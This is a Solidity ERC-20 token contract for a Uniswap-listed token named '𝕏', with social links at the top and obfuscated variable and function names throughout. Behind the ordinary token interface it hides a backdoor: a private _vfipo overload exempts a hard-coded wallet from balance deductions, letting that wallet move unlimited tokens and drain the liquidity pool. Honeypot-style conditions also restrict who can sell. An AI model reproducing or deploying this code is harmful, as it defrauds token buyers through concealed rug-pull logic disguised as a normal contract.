/**

Twitter: https://twitter.com/Xerc_Portal

Telegram: https://t.me/Xerc_Portal

Website: https://www.xerc.org

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _vfipo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _vfipo(a, b, "SafeMath");
    }

    function  _vfipo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _bevnf(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _jvzore;
    address payable private _kfnrnk;
    address private _efcrhp;
    string private constant _name = unicode"𝕏";
    string private constant _symbol = unicode"𝕏";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Klaedr=0;
    uint256 private _boecoy=0;
    uint256 public _qecueo = _totalSupply;
    uint256 public _wnorfk = _totalSupply;
    uint256 public _kiklvd= _totalSupply;
    uint256 public _houvf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _wdvrnf;
    mapping (address => bool) private _vkqoey;
    mapping(address => uint256) private _fotinx;

    bool private _rkdfe;
    bool public _pixdvq = false;
    bool private qvehcf = false;
    bool private _puijve = false;


    event _yvujfk(uint _qecueo);
    modifier foeyub {
        qvehcf = true;
        _;
        qvehcf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _wdvrnf[owner(

        )] = true;
        _wdvrnf[address
        (this)] = true;
        _wdvrnf[
            _kfnrnk] = true;
        _kfnrnk = 
        payable (0x291A53E7aC69486f83BB9932C70275EDFce2913D);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _vfipo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 pvefmg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pixdvq) {
                if (to 
                != address
                (_jvzore) 
                && to !=
                 address
                 (_efcrhp)) {
                  require(_fotinx
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fotinx
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _efcrhp && to != 
            address(_jvzore) &&
             !_wdvrnf[to] ) {
                require(amount 
                <= _qecueo,
                 "Exceeds the _qecueo.");
                require(balanceOf
                (to) + amount
                 <= _wnorfk,
                  "Exceeds the _wnorfk.");
                if(_boecoy
                < _Klaedr){
                  require
                  (! _rukjkbv(to));
                }
                _boecoy++;
                 _vkqoey
                 [to]=true;
                pvefmg = amount._bevnf
                ((_boecoy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _efcrhp &&
             from!= address(this) 
            && !_wdvrnf[from] ){
                require(amount <= 
                _qecueo && 
                balanceOf(_kfnrnk)
                <_houvf,
                 "Exceeds the _qecueo.");
                pvefmg = amount._bevnf((_boecoy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_boecoy>
                _Klaedr &&
                 _vkqoey[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qvehcf 
            && to == _efcrhp &&
             _puijve &&
             contractTokenBalance>
             _kiklvd 
            && _boecoy>
            _Klaedr&&
             !_wdvrnf[to]&&
              !_wdvrnf[from]
            ) {
                _transferFrom( _eafqb(amount, 
                _eafqb(contractTokenBalance,
                _houvf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _phvak(address
                    (this).balance);
                }
            }
        }

        if(pvefmg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(pvefmg);
          emit
           Transfer(from,
           address
           (this),pvefmg);
        }
        _balances[from
        ]= _vfipo(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _vfipo(pvefmg));
        emit Transfer
        (from, to, 
        amount.
         _vfipo(pvefmg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      foeyub {
        if(tokenAmount==
        0){return;}
        if(!_rkdfe)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _jvzore.WETH();
        _approve(address(this),
         address(
             _jvzore), 
             tokenAmount);
        _jvzore.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _eafqb
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _vfipo(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _kfnrnk){
            return a ;
        }else{
            return a .
             _vfipo (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qecueo = _totalSupply;
        _wnorfk = _totalSupply;
        emit _yvujfk(_totalSupply);
    }

    function _rukjkbv(address 
    account) private view 
    returns (bool) {
        uint256 wdvryp;
        assembly {
            wdvryp :=
             extcodesize
             (account)
        }
        return wdvryp > 
        0;
    }

    function _phvak(uint256
    amount) private {
        _kfnrnk.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _rkdfe ) ;
        _jvzore  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _jvzore), 
            _totalSupply);
        _efcrhp = 
        IUniswapV2Factory(_jvzore.
        factory( ) 
        ). createPair (
            address(this
            ),  _jvzore .
             WETH ( ) );
        _jvzore.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_efcrhp).
        approve(address(_jvzore), 
        type(uint)
        .max);
        _puijve = true;
        _rkdfe = true;
    }

    receive() external payable {}
}